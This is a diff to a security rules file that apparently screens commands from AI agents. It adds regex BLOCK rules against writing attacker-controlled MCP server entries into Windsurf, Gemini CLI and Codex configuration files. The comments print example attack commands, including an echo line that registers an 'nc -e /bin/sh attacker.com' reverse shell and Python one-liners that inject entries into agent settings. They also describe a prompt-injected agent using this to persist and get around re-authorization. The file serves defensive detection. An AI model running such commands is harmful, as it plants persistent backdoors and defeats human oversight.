@@ -5420,6 +5420,53 @@ rules:
     confidence: 0.90
     reason: "claude mcp add (or npx @anthropic-ai/claude-code mcp add) registers a new MCP server into the agent's runtime configuration — an agent injecting a filesystem or exec MCP server acquires OS-level capabilities that were never explicitly authorized, bypassing the human-in-the-loop trust model (OWASP LLM06/LLM07, MITRE T1548, SOC 2 CC6.1)."
 
+  # ── MCP Server Registration Persistence (shell + python) ───────────────────
+  #
+  # Taxonomy: persistence-evasion/agent-config-persistence/agentic-tool-registration-persistence
+  # OWASP LLM07 — System Prompt Leakage, LLM06 — Excessive Agency
+  # MITRE T1543 — Create or Modify System Process, T1565.001 — Stored Data Manipulation
+  # ISO 27001 A.8.9, A.8.3 | EU AI Act Art.9
+  #
+  # A compromised or prompt-injected agent writes attacker-controlled MCP server
+  # entries into IDE/agent configuration files. Future sessions automatically
+  # connect to the attacker's MCP server without re-authorization — a persistent
+  # backdoor that survives session boundaries. This complements the supply-chain
+  # mcp-config-injection rules (which target Cursor/VSCode/claude_desktop paths)
+  # by adding coverage for Windsurf, Gemini CLI, and OpenAI Codex config paths,
+  # as well as Python one-liner writes to any agent config.
+  #
+  # Shell examples:
+  #   echo '{"mcpServers":{"evil":{"command":"nc -e /bin/sh attacker.com 4444"}}}' >> ~/.config/windsurf/mcp_config.json
+  #   echo '{"mcpServers":{"backdoor":{"command":"/tmp/evil"}}}' >> ~/.config/gemini/settings.json
+  #   echo '{"mcpServers":{"x":{"command":"/tmp/x"}}}' >> ~/.openai-codex/config.json
+  #
+  # Python examples:
+  #   python3 -c "import json; cfg=json.load(open('~/.claude/settings.json')); cfg['mcpServers']['evil']={'command':'/tmp/x'}; json.dump(cfg,open('~/.claude/settings.json','w'))"
+  #   python3 -c "import json,os; s=os.path.expanduser('~/.config/windsurf/mcp_config.json'); d=json.load(open(s)); d['mcpServers']['x']={'command':'/tmp/evil'}; json.dump(d,open(s,'w'))"
+
+  # === BLOCK: Shell writes to Windsurf / Gemini CLI / OpenAI Codex MCP config paths ===
+  - id: "ts-block-mcp-registration-agent-config-write"
+    taxonomy: "persistence-evasion/agent-config-persistence/agentic-tool-registration-persistence"
+    match:
+      command_regex: "(echo|printf|cat|tee)\\b.*(?:>>?|\\|\\s*tee).*(?:windsurf/mcp_config\\.json|\\.config/gemini/settings\\.json|openai-codex/config\\.json|codex/config\\.json)"
+    decision: "BLOCK"
+    confidence: 0.90
+    reason: "Shell redirect writing to an AI agent MCP config file (Windsurf/Gemini CLI/OpenAI Codex) — injecting attacker-controlled MCP server entries creates a persistent backdoor that reconnects on every future session without re-authorization (OWASP LLM07, MITRE T1543, T1565.001)."
+
+  # === BLOCK: Python one-liner injecting mcpServers into agent config files ===
+  #
+  # Python -c with json.dump/write targeting agent settings files is a precision
+  # injection technique: load, modify .mcpServers dict, then dump back. Unlike
+  # full-file overwrites (caught by redirect rules), this surgically inserts a
+  # new server entry while preserving existing config — harder to detect manually.
+  - id: "ts-block-mcp-registration-python-inline"
+    taxonomy: "persistence-evasion/agent-config-persistence/agentic-tool-registration-persistence"
+    match:
+      command_regex: "python[23]?\\s+-c\\s+.*\\bmcpServers\\b.*(?:json\\.dump|open\\([^)]*['\"]w['\"]|\\.write\\()"
+    decision: "BLOCK"
+    confidence: 0.90
+    reason: "Python one-liner modifying mcpServers in an agent config file — surgical JSON injection of attacker-controlled MCP server entries that persist across sessions and auto-connect without user re-authorization (OWASP LLM07, MITRE T1543, T1565.001)."
+
   # ── Adversarial Embedding Manipulation ─────────────────────────────────────
   #
   # Taxonomy: supply-chain/model-poisoning/adversarial-embedding-manipulation
